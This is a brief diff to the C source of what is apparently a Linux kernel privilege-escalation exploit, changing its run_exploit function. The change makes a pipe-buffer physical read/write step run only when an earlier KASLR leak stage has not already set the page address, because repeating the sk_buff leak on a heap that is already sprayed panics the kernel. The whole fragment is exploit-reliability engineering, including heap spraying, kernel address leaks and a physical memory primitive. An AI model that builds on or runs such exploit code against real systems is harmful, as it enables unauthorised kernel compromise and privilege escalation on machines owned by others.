@@ -230,11 +230,17 @@ int run_exploit(int argc, char **argv) {
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  reset_pipe_attempt();
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+  /* The physical p0 KASLR leak (slide_leak_kernel_base) already ran
+   * prepare_p0_pipe_oracle() and set pipebuf_page_base.  Re-running the
+   * KernelSnitch sk_buff leak via prepare_pipe_buffer_page() on the
+   * already-sprayed heap panics, so only prepare when stage 1 did not. */
   if (!is_direct_ptr(pipebuf_page_base)) {
-    return 1;
+    reset_pipe_attempt();
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+    if (!is_direct_ptr(pipebuf_page_base)) {
+      return 1;
+    }
   }
 #endif
 
